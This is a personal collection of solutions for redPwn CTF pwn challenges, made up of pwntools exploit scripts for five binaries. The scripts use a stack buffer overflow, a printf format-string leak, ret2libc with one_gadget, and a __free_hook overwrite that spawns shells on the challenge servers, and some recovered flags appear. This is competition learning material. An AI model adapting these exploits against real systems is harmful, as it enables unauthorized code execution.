# CTF_collection

## redPwn:

赛中不冲赛后冲@!@

### pwn1:

exp:

```
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 2
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("mc.ax",31199)
	# libc = ELF("./libc.so.6",checksec=False)

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

pd = 'a'*(0x30 - 8)
pd += p64(0xFFFFFFFFFFFFFFFF)

sla("can you write me a heartfelt message to cheer me up? :(\n",pd)
ti()

```



### pwn2:

exp:

```
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug =2
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("mc.ax",31077)
	# libc = ELF("./libc.so.6",checksec=False)

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

pd = 'a'*0x28
pd += p64(0x00000000004011F6)

sla("this is genius!! what do you think?\n",pd)
ti()

```



### pwn3:

%p逐字节读出来的

exp:

```
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug =2
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("mc.ax",31569)
	# libc = ELF("./libc.so.6",checksec=False)

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

pd = 'please'
pd += '%70$p'
pd += '%71$p'
pd += '%72$p'
pd += '%73$p'
pd += '%74$p'
pd += '%75$p'
pd += '%76$p'
# gdb.attach(p,"b *$rebase(0x00001274)")
sla("what do you say?\n",pd)
#flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
# ying du
p.recvuntil("please")
ti()

```



### pwn4:

exp:

```
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug =2
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("mc.ax",31568)
	libc = ELF("./libc-2.28.so",checksec=False)

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)
pop_rdi = 0x00000000004012a3
addr_main = 0x0000000000401186

pd = 'a'*0x28
pd += p64(addr_main)
sla("where is this place? can you help me get there safely?\n",pd)
p.recvuntil("rob said i'd need this to get there: ")
printf_addr = int(p.recv(12),16)
libc.address = printf_addr - libc.sym['printf']
sys_addr = libc.sym['system']
bin_sh = libc.address + libc.search("/bin/sh").next()

pd = 'a'*0x28
pd += p64(libc.address + 0x4484f)
# pd += p64(pop_rdi)
# pd += p64(bin_sh)
# pd += p64(sys_addr)
# ???? one is ok but system("/bin/sh") wrong
sla("where is this place? can you help me get there safely?\n",pd)
success("printf_addr = " + hex(printf_addr))
success("libc.address = " + hex(libc.address))
success("sys_addr = " + hex(sys_addr))
success("bin_sh = " + hex(bin_sh))
# flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}

ti()
```



### pwn5:

存在一个任意写，因为mmap分配chunk与libc基址偏移固定，可以直接泄露libc

然后直接改free_hook为one，利用的是写入大量的数据后，会调用malloc/free操作

exp:

```
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 2
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("mc.ax",31547)
	libc = ELF("./libc.so.6",checksec=False)

one = [0x4484f,0x448a3,0xe5456]
sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)
sla("how big?\n",str(0x2000000))
p.recvuntil("you are here: 0x")
mmap_addr = int(p.recv(12),16)
libc.address = mmap_addr + 0x2000ff0

og = libc.address + one[2]
free_hook = libc.sym['__free_hook']
# global_ = 0x1ebf60 + libc.address
offset = (free_hook - mmap_addr) / 8

sla("how far?\n",str(offset))
sla("what?\n",'0'*11000 + str(og))
success("libc.address = " + hex(libc.address))
success("og = " + hex(og))
success("mmap_addr = " + hex(mmap_addr))
# flag{sc4nf_i3_4_h34p_ch4l13ng3_TKRs8b1DRlN1hoLJ}

ti()

```



### pwn6：



### pwn7：



### pwn8：

